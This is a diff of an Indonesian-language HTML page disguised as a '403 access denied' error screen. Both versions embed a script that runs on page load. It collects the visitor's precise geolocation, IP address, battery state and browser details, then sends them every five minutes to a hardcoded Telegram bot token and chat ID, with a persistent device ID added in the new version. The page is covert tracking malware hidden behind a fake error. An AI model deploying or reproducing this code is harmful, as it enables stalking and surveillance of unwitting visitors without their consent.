@@ -1,106 +1,121 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>ERROR 403 | Data Base Nusantara</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>System Error</title>
   <style>
     body {
-      font-family: 'Courier New', monospace;
-      background-color: #0f0f0f;
-      color: #ffffff;
+      margin: 0;
+      font-family: 'Courier New', Courier, monospace;
+      background-color: black;
+      color: red;
       text-align: center;
-      padding: 30px;
     }
-    img {
-      width: 150px;
-      filter: grayscale(100%) brightness(200%);
-      margin-bottom: 20px;
+    .logo {
+      margin-top: 40px;
+    }
+    .logo img {
+      width: 60px;
+      opacity: 0.8;
     }
     h1 {
-      color: #ff4444;
       font-size: 22px;
-    }
-    .map {
       margin-top: 20px;
-      width: 100%;
-      height: 300px;
-      border: none;
+    }
+    p {
+      font-size: 14px;
+      color: white;
     }
   </style>
 </head>
 <body>
-
-  <img src="https://borneo101.github.io/DataBaseNusantara/garuda_ai.png" alt="Garuda AI">
-
+  <div class="logo">
+    <img src="https://borneo101.github.io/DataBaseNusantara/garuda_ai.png" alt="Garuda AI Logo"/>
+  </div>
   <h1>ANDA TIDAK MEMILIKI IZIN UNTUK MENGAKSES DATA BASE INI</h1>
-  <p>Pelacakan otomatis sedang dijalankan...</p>
+  <p>Sistem sedang dalam mode verifikasi sistem internal...</p>
 
-  <iframe id="map" class="map" src="" allowfullscreen></iframe>
-
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <script>
-    const chat_id = "5677912817"; // Ganti dengan ID mu
-    const bot_token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko"; // Ganti dengan token bot
+    const botToken = '7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko';
+    const chatId = '5677912817';
+    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-    function kirimData(data) {
-      const url = `https://api.telegram.org/bot${bot_token}/sendMessage`;
-      $.post(url, { chat_id, text: data });
+    function generateDeviceId() {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+      let result = 'DEV-';
+      for (let i = 0; i < 10; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return result;
     }
 
-    function updateMap(lat, lon) {
-      document.getElementById("map").src = `https://maps.google.com/maps?q=${lat},${lon}&hl=es;z=14&output=embed`;
+    let deviceId = localStorage.getItem("deviceId");
+    if (!deviceId) {
+      deviceId = generateDeviceId();
+      localStorage.setItem("deviceId", deviceId);
     }
 
-    function collectAndSend() {
-      navigator.geolocation.getCurrentPosition(async function(pos) {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const accuracy = pos.coords.accuracy;
-        const altitude = pos.coords.altitude || "Unknown";
-        const speed = pos.coords.speed || "Unknown";
-        const heading = pos.coords.heading || "Unknown";
+    async function sendData() {
+      try {
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+        });
 
-        updateMap(lat, lon);
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+        const altitude = position.coords.altitude || 'Unknown';
+        const speed = position.coords.speed || 'Unknown';
+        const heading = position.coords.heading || 'Unknown';
 
         const battery = await navigator.getBattery();
         const level = Math.round(battery.level * 100);
         const charging = battery.charging ? "Charging" : "Not Charging";
 
-        const ipRes = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+        const ipReq = await fetch('https://api.ipify.org?format=json');
+        const ipRes = await ipReq.json();
         const ip = ipRes.ip;
 
-        const now = new Date();
-        const utc = now.toUTCString();
-        const local = now.toLocaleString("id-ID");
+        const userAgent = navigator.userAgent;
+        const language = navigator.language;
+        const platform = navigator.platform;
+        const online = navigator.onLine;
+        const localTime = new Date().toLocaleString();
+        const utcTime = new Date().toUTCString();
 
-        const payload = `
-[TRACKING DEVICE]
+        const message = `Scorpio Ops:[TRACKING DEVICE]
+ID: ${deviceId}
 IP: ${ip}
 Battery: ${level}% (${charging})
-User Agent: ${navigator.userAgent}
-Language: ${navigator.language}
-Platform: ${navigator.platform}
-Online: ${navigator.onLine}
-
+User Agent: ${userAgent}
+Language: ${language}
+Platform: ${platform}
+Online: ${online}
 Lokasi:
-Latitude: ${lat}
-Longitude: ${lon}
+Latitude: ${latitude}
+Longitude: ${longitude}
 Accuracy: ${accuracy}m
 Altitude: ${altitude}
 Speed: ${speed}
 Heading: ${heading}
-Local Time: ${local}
-UTC: ${utc}
-Map: https://maps.google.com/?q=${lat},${lon}
-        `.trim();
+Local Time: ${localTime}
+UTC: ${utcTime}
+Map: https://maps.google.com/?q=${latitude},${longitude}`;
 
-        kirimData(payload);
-      });
+        fetch(apiUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: message })
+        });
+      } catch (err) {
+        console.error('Error mengirim data:', err);
+      }
     }
 
-    collectAndSend();
-    setInterval(collectAndSend, 5 * 60 * 1000);
+    sendData();
+    setInterval(sendData, 300000); // kirim ulang setiap 5 menit
   </script>
 </body>
 </html>
